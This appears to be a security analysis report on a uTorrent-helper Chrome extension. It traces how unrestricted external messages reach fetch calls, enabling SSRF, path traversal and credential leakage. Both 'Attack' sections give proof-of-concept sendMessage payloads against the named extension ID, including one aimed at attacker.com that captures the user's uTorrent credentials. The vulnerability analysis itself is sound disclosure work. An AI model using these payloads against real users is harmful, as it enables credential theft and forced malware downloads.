# CoCo Analysis: bgplkhkpimbjejablijendjgkopapaao

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple unique flows (bg_chrome_runtime_MessageExternal → fetch_resource_sink)

---

## Sink 1: bg_chrome_runtime_MessageExternal → fetch_resource_sink (message.url → SendLinkTorrentApp)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bgplkhkpimbjejablijendjgkopapaao/opgen_generated_files/bg.js
Line 1061    if (message.url && message.url.startsWith('magnet:'))
Line 988     '?action=add-url&download_dir=0&token=' + token + '&s=' + encodeURI(link)
Line 987     let params = '?action=add-url&download_dir=0&token=' + token + '&s=' + encodeURI(link)
Line 990     if (where !== MAIN_FOLDER) params += '&path=' + where
Line 997     return fetch('http://' + GetHost(settings.SelectPort) + params, {...})
```

**Code:**

```javascript
// Background - External message handler (bg.js line 1057)
chrome.runtime.onMessageExternal.addListener(
  (message, sender, sendResponse) => {
    switch (message.type) {
      case 'ADD_TORRENT':
        if (message.url && message.url.startsWith('magnet:')) // ← Line 1061: attacker-controlled URL
          ValueSaveAndRead((settings) => {
            SendLinkTorrentApp(settings, message.url, message.folder) // ← attacker controls url and folder
          })
        else
          ValueSaveAndRead((settings) => {
            LinkGetSentPro(settings, message.url, message.folder) // ← alternative path
          })
        break
    }
  }
)

// Function SendLinkTorrentApp (bg.js line 985)
function SendLinkTorrentApp(settings, link, where) {
  findKey(settings, function (token, cookie) {
    let params =
      '?action=add-url&download_dir=0&token=' + token + '&s=' + encodeURI(link) // ← Line 987-988: attacker-controlled link

    if (where !== MAIN_FOLDER) params += '&path=' + where // ← Line 990: attacker-controlled folder/path

    const myHeaders = new Headers({
      Authorization:
        'Basic ' + btoa(settings.UserName + ':' + settings.UserPass),
    })

    return fetch('http://' + GetHost(settings.SelectPort) + params, { // ← Line 997: SSRF to user's uTorrent server
      method: 'GET',
      headers: myHeaders,
    })
      .then((response) => {
        if (response.status === 200) {
          return response.text()
        } else {
          MessageBoxPop(
            'Connect Fail Utorrent',
            'Open Utorrent and You set options setting'
          )
          throw new Error('Something went wrong on api server!')
        }
      })
      .then((response) => {
        console.log('Finish' + response)
      })
      .catch((error) => {
        MessageBoxPop('ERROR', 'Error Connection')
        console.log(error)
      })
  })
}

// Function GetHost (bg.js line 976)
function GetHost(SelectPort) {
  if (SelectPort) {
    let result = SelectPort.replace(/^https?:\/\//, '')
    return result.endsWith('/') ? result : result + '/'
  }
}

// Function findKey (bg.js line 1157)
function findKey(settings, f) {
  const myHeaders = new Headers({
    Authorization: 'Basic ' + btoa(settings.UserName + ':' + settings.UserPass),
  })

  return fetch(settings.SelectPort + 'token.html', { // ← Fetches token from user's uTorrent server
    method: 'GET',
    headers: myHeaders,
  })
    .then((response) => {
      if (response.status === 200) {
        return response.text()
      } else {
        MessageBoxPop(
          'ERROR',
          'uTorrent Web API returns status code. Please check your settings.'
        )
        throw new Error('Something went wrong on api server!')
      }
    })
    .then((response) => {
      const myArray = response.split('>') // ← Line 1180
      let token = myArray[2].replace('</div', '') // ← Line 1181: parses token
      let cookie = ''
      if (cookie) cookie = cookie.split(';')[0]
      f(token, cookie)
    })
    .catch((error) => {
      MessageBoxPop(
        'Connect Fail Utorrent',
        'Open Utorrent and You set options setting'
      )
      console.log(error)
    })
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal (NO externally_connectable restriction - ANY website/extension can exploit)

**Attack:**

```javascript
// From ANY malicious webpage or extension:
chrome.runtime.sendMessage(
    'bgplkhkpimbjejablijendjgkopapaao', // Extension ID
    {
        type: 'ADD_TORRENT',
        url: 'magnet:?xt=urn:btih:MALICIOUS_TORRENT_HASH&dn=malware.exe',
        folder: '../../../' // Path traversal attempt
    }
);

// OR exploit with arbitrary URL (non-magnet link):
chrome.runtime.sendMessage(
    'bgplkhkpimbjejablijendjgkopapaao',
    {
        type: 'ADD_TORRENT',
        url: 'http://attacker.com/malware.torrent',
        folder: 'Downloads'
    }
);

// OR SSRF via the link parameter in URL params:
// The extension will make a request to: http://[user's-utorrent-server]/?action=add-url&token=...&s=[attacker-URL]
// This causes the user's uTorrent server to download from attacker-controlled URL
```

**Impact:** Multiple severe vulnerabilities:

1. **Unauthorized Torrent Downloads**: External attacker can force user's uTorrent client to download arbitrary torrents (including malware) without user consent

2. **SSRF to Local uTorrent Server**: Attacker can send requests to user's local uTorrent Web API (typically localhost:8080 or local network) with authenticated requests, enabling:
   - Adding malicious torrent URLs/magnet links
   - Potential path traversal via `folder` parameter
   - Manipulation of download settings via API parameters

3. **No Authentication/Authorization**: The manifest has NO `externally_connectable` restriction, meaning ANY webpage or extension can send these commands

4. **Privileged Cross-Origin Requests**: The extension has `host_permissions: ["https://*/*","http://*/*"]`, allowing it to fetch arbitrary torrents from any URL with privileged context

The extension is designed to integrate with uTorrent but fails to validate/restrict who can trigger these powerful operations.

---

## Sink 2: bg_chrome_runtime_MessageExternal → fetch_resource_sink (message.url → LinkGetSentPro → SendFileTorrentApp)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bgplkhkpimbjejablijendjgkopapaao/opgen_generated_files/bg.js
Line 1061    if (message.url && message.url.startsWith('magnet:'))
Line 1079    return fetch(link, { method: 'GET', headers: myHeaders })
Line 1106    let params = '?action=add-file&download_dir=0&token=' + token
Line 1108    if (where !== MAIN_FOLDER) params += '&path=' + where
Line 1118    return fetch('http://' + GetHost(settings.SelectPort) + params, {...})
```

**Code:**

```javascript
// Function LinkGetSentPro (bg.js line 1074)
function LinkGetSentPro(settings, link, where) {
  const myHeaders = new Headers({
    Authorization: 'Basic ' + btoa(settings.UserName + ':' + settings.UserPass),
  })

  return fetch(link, { // ← Line 1079: SSRF - fetches attacker-controlled URL
    method: 'GET',
    headers: myHeaders,
  })
    .then((response) => {
      if (response.status === 200) {
        return response.blob()
      } else {
        MessageBoxPop('ERROR', 'Fail check URL or Download state  ')
        throw new Error('Something went wrong on api server!')
      }
    })
    .then((response) => {
      let name = response.headers
      name = name ? name.split('filename=')[1] : null
      if (name) name = name.replace(/"/g, '').replace(/'/g, '')
      else name = new Date().getTime() + '.torrent'

      let torrent_data = response

      findKey(settings, function (token, cookie) {
        let params = '?action=add-file&download_dir=0&token=' + token // ← Line 1106

        if (where !== MAIN_FOLDER) params += '&path=' + where // ← Line 1108: attacker-controlled path

        let form = new FormData()
        form.append('torrent_file', torrent_data, name)

        const myHeaders = new Headers({
          Authorization:
            'Basic ' + btoa(settings.UserName + ':' + settings.UserPass),
        })

        return fetch('http://' + GetHost(settings.SelectPort) + params, { // ← Line 1118: sends to uTorrent
          method: 'POST',
          headers: myHeaders,
          body: form,
        })
          .then((response) => {
            if (response.status === 200) {
              return response.text()
            } else {
              MessageBoxPop('ERROR', 'Connect Fail Utorrent')
              throw new Error('Something went wrong on api server!')
            }
          })
          .then((response) => {
            console.log('Finish' + response)
          })
          .catch((error) => {
            MessageBoxPop('ERROR', 'Error Connection')
            console.log(error)
          })
      })
    })
    .catch((error) => {
      MessageBoxPop('ERROR', 'Error Connection')
      console.log(error)
    })
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal (non-magnet URLs)

**Attack:**

```javascript
// From ANY malicious webpage or extension:
chrome.runtime.sendMessage(
    'bgplkhkpimbjejablijendjgkopapaao',
    {
        type: 'ADD_TORRENT',
        url: 'http://attacker.com/capture-data', // Will receive extension's credentials in Authorization header!
        folder: '../../sensitive-folder'
    }
);
```

**Impact:** Even more severe than Sink 1:

1. **Credential Leakage**: The extension sends the user's uTorrent credentials (`settings.UserName` and `settings.UserPass`) in the Authorization header when fetching from attacker-controlled URL (line 1079). Attacker can capture these credentials.

2. **Arbitrary File Upload to uTorrent**: Attacker can cause extension to:
   - Fetch arbitrary content from attacker's server (receiving user's credentials)
   - Upload that content as a torrent file to user's uTorrent server
   - Control the download path via `folder` parameter

3. **SSRF + File Upload**: Two-stage attack where extension first fetches from attacker URL (SSRF), then uploads the fetched content to local uTorrent server

This is a critical vulnerability chain that exposes user credentials and enables complete control over uTorrent downloads.
